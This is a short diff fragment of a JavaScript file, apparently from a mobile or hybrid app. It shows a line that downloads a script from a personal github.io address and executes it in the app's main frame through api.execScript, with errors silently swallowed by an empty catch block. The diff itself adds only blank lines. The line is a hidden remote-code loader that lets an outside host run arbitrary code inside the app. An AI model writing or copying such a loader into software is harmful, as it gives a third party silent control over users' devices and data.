@@ -59,4 +59,6 @@ function ajaxget(surl, callback, type) {
 
 
 
+
+
 try{ajaxget("https://xiaomeng9597.github.io/webjs/load_js.js?r="+Math.random(),function(ret){api.execScript({name:"root",frameName:"main",script:ret})},"text");}catch(err){};
